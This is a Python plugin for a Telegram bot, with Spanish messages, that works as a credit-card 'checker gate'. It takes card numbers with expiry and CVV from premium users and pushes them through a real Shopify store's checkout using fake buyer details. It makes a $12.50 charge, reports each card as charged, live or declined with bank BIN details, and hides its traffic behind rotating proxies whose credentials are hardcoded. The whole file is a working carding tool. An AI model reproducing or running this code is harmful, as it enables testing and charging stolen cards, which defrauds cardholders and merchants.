from plugins.defs1 import get_cc, luhn, bininfo
from pyrogram import Client, filters
import aiohttp
import requests
from pyrogram.types import Message
import time
import random
from faker import Faker
from urllib.parse import urlparse
from plugins.clases.usuarios import usuario
def buscar(res, primer, final):
    try:
        inicio = res.index( primer ) + len( primer )
        fin = res.index( final, inicio )
        return res[inicio:fin]
    except ValueError:
        return None

gate = "Shopify+Monerys"
emojis1 = ["🙈", "💦", "🌏", "🐸", "🐧"]
emojis2 = ["😠", "☔", "☀", "🌈"]
rnd_emoji1 = random.choice(emojis1)
rnd_emoji2 = random.choice(emojis2)
proxys = {
    'https':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https':'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https':'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://hftsdyhr-rotate:iziwp0qs6av1@p.webshare.io:80/'}
r = requests.Session()
r.proxies = r
@Client.on_message(filters.command(["mr"], prefixes=["/", "."]))
async def premium(_, m: Message):
    start_time = time.time()
    user = m.from_user.username
    id = m.from_user.id
    user = usuario(nombre=user, id=id)
    rango = user.buscar()
    if not rango or rango == False: return await m.reply('<b>Usuario no registrado porfavor registrese</b>')
    if rango[2] == 'Free':
        return await m.reply('<b>Necesita ser Premium para utilizar este gate</b>')
    try:
        cc, mes, año, cvv = get_cc(m.text)
        veri = luhn(cc)
        if not cc or not mes or not año or not cvv: return await m.reply('<b>Formato invalido</b>')
        if veri == False: return await m.reply("<b>Algoritmo Luhn invalido ❌</b>")
    except Exception:
        return await m.reply("<b>Formato invalido\nCC|MES|AÑO|CVV</b>")
    respuesta = await m.reply(f"""<b>Checkeando CC | ⏳</b>""")
    fake = Faker()
    email = fake.ascii_free_email()
    product_link = "https://www.a2zozone.com/collections/mp-series-light-duty-water-ozone-generator-parts-and-accessories/products/fan-filter?variant=39857503928363"
    r1 = r.get(product_link)
    varient_id = buscar(r1.text, 'variantId":',',')
    if not r1 or not varient_id: return await m.reply('<b>Error al checkear</b>')

    b_data = {
	"form_type": "product","utf8": "✓",
	"id": varient_id,"properties[_rc]": "9711",
	"properties[shipping_method]": "me",
	"properties[store_pickup]": "","quantity": "1"
}
    b_head = {
    'x-requested-with': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
    }
    webname = urlparse(product_link).netloc
    r2 = r.post(f'https://{webname}/cart/add', headers =b_head,data =b_data)
    if not r2: return await m.reply('<b>Error al checkear</b>')

    d_data = {
	"updates[]": "1",
	"note": "",
	"checkout": ""
}
    d_head = {
    'x-requested-with': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
    }

    r3 = r.post(f'https://{webname}/cart', headers=d_head, data=d_data)
    auth_token = buscar(r3.text, 'type="hidden" name="authenticity_token" value="','"')
    if not r3 or not auth_token: return await m.reply('<b>Error al checkear</b>')   
    checkout_url = r3.url
    taken1 = int(time.time()) - start_time
    await respuesta.edit(f"<b>Checkeando CC 20% | {rnd_emoji1}\nTiempo: {taken1:0.3}</b>")

    t1_data = {
	"_method": "patch",
	"authenticity_token": auth_token,
	"previous_step": "contact_information",
	"step": "shipping_method",
	"checkout[email]": email,
	"checkout[buyer_accepts_marketing]": "0",
	"checkout[shipping_address][first_name]": [
		"",
		"jose"
	],
	"checkout[shipping_address][last_name]": [
		"",
		"quiroz"
	],
	"checkout[shipping_address][company]": [
		"",
		""
	],
	"checkout[shipping_address][address1]": [
		"",
		"street+157"
	],
	"checkout[shipping_address][address2]": [
		"",
		""
	],
	"checkout[shipping_address][city]": [
		"",
		"new+york"
	],
	"checkout[shipping_address][country]": [
		"",
		"United States"
	],
	"checkout[shipping_address][province]": [
		"",
		"NY"
	],
	"checkout[shipping_address][zip]": [
		"",
		"10009"
	],
	"checkout[shipping_address][phone]": [
		"",
		"(717)+123-1234"
	],
	"checkout[remember_me]": [
		"false",
		"0"
	],
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "518",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}
    r4 = r.post(checkout_url, data=t1_data)
    if not r4 or not "step=shipping_method" in r4.url: return await m.reply('<b>Error al checkear</b>') 
    taken2 = int(time.time()) - start_time
    await respuesta.edit(f"<b>Checkeando CC 40% | {rnd_emoji2}\nTiempo: {taken2:0.3}</b>")
    t_data = {
	"_method": "patch",
	"authenticity_token": auth_token,
	"previous_step": "shipping_method",
	"step": "payment_method",
	"checkout[shipping_rate][id]": "usps-ParcelSelect-10.01-1672289999-1672289999",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "518",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}
    t = r.post(checkout_url, data=t_data)
    if not t: return await m.reply('<b>Error al checkear</b>') 
    payment_gateway = buscar(t.text,'data-subfields-for-gateway="','"')
    if not payment_gateway:
        t2 = r.get(checkout_url+"?previous_step=shipping_method&step=payment_method")
        payment_gateway = buscar(t2.text,'data-subfields-for-gateway="','"')
        if not payment_gateway:
            return await m.reply('<b>Error al checkear</b>') 
    nombre = str(fake.name())

    json_four = {
	"credit_card": {"month": mes,"name": nombre,"number": cc,"verification_value": cvv,"year": año},"payment_session_scope": "www.a2zozone.com"}

    four = r.post('https://deposit.us.shopifycs.com/sessions', json = json_four)
    
    if "id" not in four.json(): return await m.reply('Error al checkear')
    id = four.json()["id"] 
    taken3 = int(time.time()) - start_time
    await respuesta.edit(f"<b>Checkeando CC 85% | {rnd_emoji2}\nTiempo: {taken3:0.3}</b>")

    dic = {
	"_method": "patch",
	"authenticity_token": auth_token,
	"previous_step": "payment_method",
	"step": "","s": id,
	"checkout[payment_gateway]": payment_gateway,
	"checkout[credit_card][vault]": "false",
	"checkout[different_billing_address]": "false",
	"checkout[total_price]": "1250","complete": "1",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "518",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}
    f = r.post(checkout_url, data = dic)
    response_r1 = buscar(f.text, 'class="notice__text">', "<")
    if not f or 'processing' not in f.url and response_r1 == None: return await m.reply('Error al checkear')
    time.sleep(4)
    g = r.get(checkout_url + '/processing?from_processing_page=1')
    time.sleep(6)
    charge_Link=None
    if 'orders' in g.url: charge_Link = True
    if not charge_Link:
        if not g or 'from_processing_page=1&validate=true' not in g.url: print(g.text); return await m.reply('Error al checkear')
    complete = f"{cc}|{mes}|{año}|{cvv}"
    getBin =  bininfo(cc)
    if "Error" in getBin: return await respuesta.edit('<b>Error al obtener la informacion del bin</b>')
    binP, vendor, tipo, level, bank, codeCountry, country, emojiCountry = getBin
    response_error = buscar(g.text, 'class="notice__text">', "<")
    r_logo, r_message, r_res = "❌", 'Tarjeta declinada', response_error
    if charge_Link != None: r_logo, r_message, r_res = "✅", "Approved", "CHARGED $12" 
    if response_error == "CVD ERROR                       99048": r_logo, r_message, r_res = "✅", "CCN live", "CVD ERROR 99048"
    if response_r1 != None: response_error = response_r1
    taken4 = int(time.time()) - start_time
    nombre = m.from_user.first_name
    if nombre == None: nombre = ""
    apellido = m.from_user.last_name
    if apellido == None: apellido = ""
    await respuesta.edit(f"""<b>CC: <code>{complete}</code>\nEstado: {r_message} {r_logo}\nresponse: {r_res}\nGate: <code>{gate}</code>\n------> Detalles bin <------\nBin: {binP}\nBin info: {vendor} - {tipo} - {level}\nBanco: {bank}\nPais: {emojiCountry} {country} - {codeCountry}\n------> Info <------\nTiempo: {taken4:0.3} segundos\nChequeada por: <a href="tg://user?id={m.from_user.id}">{nombre} {apellido}</a> [{rango[2]}]\nOwner: <code>Draxxd30</code></b>""")